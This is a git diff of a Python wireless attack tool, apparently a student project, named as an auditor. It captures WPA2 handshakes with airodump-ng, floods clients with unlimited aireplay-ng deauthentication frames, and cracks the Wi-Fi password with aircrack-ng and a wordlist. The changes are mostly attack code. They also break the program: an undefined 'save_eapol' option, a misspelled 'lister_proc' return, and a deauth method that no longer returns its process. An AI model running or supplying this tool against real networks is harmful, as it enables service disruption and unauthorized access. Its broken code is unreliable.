@@ -9,11 +9,12 @@ import time
 class Auditor:
 	# Options list for the Auditor class
 	options = {
-	"ap_channel": "157",
-	"ap_bssid": "36:cf:f6:f2:fb:34",
-	"ap_ssid": "",
-	"eapol_cap_name": "/home/matt_school/Desktop/eapol-capture",
-	"dict_file": "/usr/share/wordlists/john.lst"
+	'ap_channel': '157',
+	'ap_bssid': '36:cf:f6:f2:fb:34',
+	'ap_ssid': '',
+	'eapol_cap_name': 'eapol',
+	'eapol_saved_path': '',
+	'dict_file': '/usr/share/wordlists/john.lst'
 	}
 
 	def __init__(self, iface, iface_mode):
@@ -146,6 +147,7 @@ class Auditor:
 	def wpa2_cracking_attack(self):
 		'''
 		Perform a WPA2 Cracking Attack.
+		4. Run the cracking attack.
 		'''
 		# Create the listener for capturing EAPOL packets
 		listener_proc = self.create_listener()
@@ -160,8 +162,34 @@ class Auditor:
 		# Terminate the listener process
 		listener_proc.terminate()
 
-		# Crack the password from the captured EAPOL packets
-		self.create_cracker()
+		''' 3. Write a method here of checking the EAPOL packets were saved properly '''
+
+		''' 4. Crack the Wi-Fi Password '''
+
+		print("\n" * 5)
+
+		# The command is big and would look bad when run with subprocess
+		crack_pass_cmd = [
+		"aircrack-ng",
+		"-w", f"{self.options['dict_file']}",
+		"-b", f"{self.options['ap_bssid']}",
+		f"{self.options['save_eapol']}",
+		]
+
+		try:
+			# Run the Deauthentication command
+			subprocess.run(crack_pass_cmd, check=True)
+
+		# If subprocess gives this error exit
+		except subprocess.CalledProcessError:
+			print("Something went wrong!!")
+			sys.exit()
+
+		# If theres a keyboard interrupt, prompt the user to 
+		# keep running the program or to quit.
+		except KeyboardInterrupt:
+			self.keep_running()
+
 
 	def auth_flood():
 		'''
@@ -243,8 +271,8 @@ class Auditor:
 					time.sleep(3)
 					continue
 			except Exception as e:
+				self.clear_term()
 				print("Invalid Option, Retry the Option...")
-				print(e)
 				time.sleep(3)
 				continue
 
@@ -305,14 +333,14 @@ class Auditor:
 
 	def create_listener(self):
 		'''
-		Run a command to start for the listener (catches EAPOL packets)
+		Start a thread for the listener (catches EAPOL packets)
 		'''
 		# List for all of the options of the airodump command.
 		listener_cmd = [
 		"airodump-ng",
 		"-c", f"{self.options['ap_channel']}",
 		"-d", f"{self.options['ap_bssid']}",
-		"-w", f"{self.options['eapol_cap_name']}",
+		"-w", f"{self.options['save_eapol']}",
 		f"{self.iface}"
 		]
 
@@ -322,40 +350,22 @@ class Auditor:
 
 		# If subprocess gives this error exit
 		except Exception as e:
-			print(e)
 			print("Something went wrong!!")
 			sys.exit()
 
-		return listener_proc
+		return lister_proc
 
-	def create_cracker(self):
-		'''
-		Run a command to crack EAPOL packets for a Wi-Fi password
-		'''
-		# List of all of the options for the aircrack command.
-		crack_pass_cmd = [
-		"aircrack-ng",
-		"-w", f"{self.options['dict_file']}",
-		"-b", f"{self.options['ap_bssid']}",
-		f"/home/matt_school/Desktop/eapol-capture-01.cap",
-		]
-
-		try:
-			# Run the Deauthentication command
-			subprocess.run(crack_pass_cmd, check=True)
-
-		# If subprocess gives this error exit
-		except subprocess.CalledProcessError:
-			print("Something went wrong!!")
-			sys.exit()
 
 
 	def create_deauther(self):
 		'''
-		Run a command to deauthenticate the users
-		from the specified BSSID
+		Start a thread for the Wi-Fi deauth
 		'''
-		# List for all of the options of the aireplay command.
+		# Stop the execution for 10 seconds to allow the listener
+		# to get running
+		time.sleep(10)
+
+		# List for all of the options of the airreplay command.
 		deauth_cmd = [
 		"aireplay-ng",
 		"-0", "0",
@@ -365,16 +375,19 @@ class Auditor:
 
 		try:
 			# Run the Deauthentication command
-			time.sleep(3)
+			time.sleep(5)
 			deauth_proc = subprocess.Popen(deauth_cmd)
-			time.sleep(3)
+			time.sleep(5)
 
 		# If subprocess gives this error exit
 		except Exception as e:
 			print("Something went wrong!!")
 			sys.exit()
 
-		return deauth_proc
+#		finally:
+#			# Wait a specified amount of time and then terminate the process
+#			deauth_proc.terminate()
+#			listener_proc.terminate()
 
 
 	def banner_print(self):
